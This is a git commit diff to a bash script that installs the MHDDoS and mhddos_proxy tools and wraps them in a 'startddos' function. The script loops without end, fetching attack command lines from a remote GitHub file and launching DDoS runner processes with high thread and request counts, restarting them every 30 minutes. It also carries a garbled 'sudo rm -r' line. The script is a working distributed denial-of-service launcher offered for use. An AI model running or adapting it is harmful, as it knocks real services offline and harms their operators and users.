a71675d476f0f696207ad2d3b5256d7c888ac3cb
KarboDuck <53382906+KarboDuck@users.noreply.github.com>
2022-04-13 16:01:09 +0300

    Update test.sh

--- bash/test.sh
+++ bash/test.sh
@@ -1,4 +1,16 @@
 #!/bin/bash
+
+usage() {
+cat << EOF
+usage: ./auto_bash.sh [-t|-r|--table]
+                        [-t THREADS]      (default = 1000)
+                        [-r RPC]          (default = 2000)
+                        [--table]         (default = off)
+                        [-h]              show this menu
+EOF
+}
+
+startddos () {
 # Install git, python3, pip, mhddos_proxy, MHDDoS and updated proxy list.
 sudo apt update -qq -y
 sudo apt install git python3 python3-pip -qq -y
@@ -7,21 +19,12 @@ sudo apt install gcc libc-dev libffi-dev libssl-dev python3-dev rustc -qq -y
 sudo pip install --upgrade pip
 
 cd ~
-sudo rm -r mhddos_proxy
+sudo rm -r mhddos_proxy-n 10
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
 python3 -m pip install -r ~/mhddos_proxy/requirements.txt
 cd mhddos_proxy
-#rm proxies_config.json
-#curl -o proxies_config.json https://raw.githubusercontent.com/Aruiem234/mhddosproxy/main/proxies_config.json 
 git clone https://github.com/MHProDev/MHDDoS.git
-
-threads="${1:-3000}"; threads="-t $threads"
-rpc="--rpc 3000"
-proxy_upd="-p 3600"
-debug="--debug"
-table="--table"
-
-# Restart attacks and update targets every 15 minutes
+  
 while true
 do
    pkill -f start.py; pkill -f runner.py 
@@ -35,7 +38,25 @@ do
    for (( i=1; i<=list_size; i++ ))
       do
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/tg_test  | cat | grep "^[^#]")")
-            python3 ~/mhddos_proxy/runner.py $cmd_line $threads $rpc $proxy_upd $debug&
+            python3 ~/mhddos_proxy/runner.py $cmd_line $threads $rpc $debug $table&
       done
 sleep 30m
 done
+}
+
+threads="-t 1000"
+rpc="--rpc 2000"
+debug="--debug"
+table=""
+
+while [ "$1" != "" ]; do
+    case $1 in
+      -t | --threads )   threads="-t $2"; shift 2;;
+      -r | --rpc )    rpc="--rpc $2";  shift 2  ;;
+      -h | --help )      usage;   exit  ;;
+      --table )   table="--table"; shift ;;
+      * )                usage    exit 1
+    esac
+done
+
+startddos
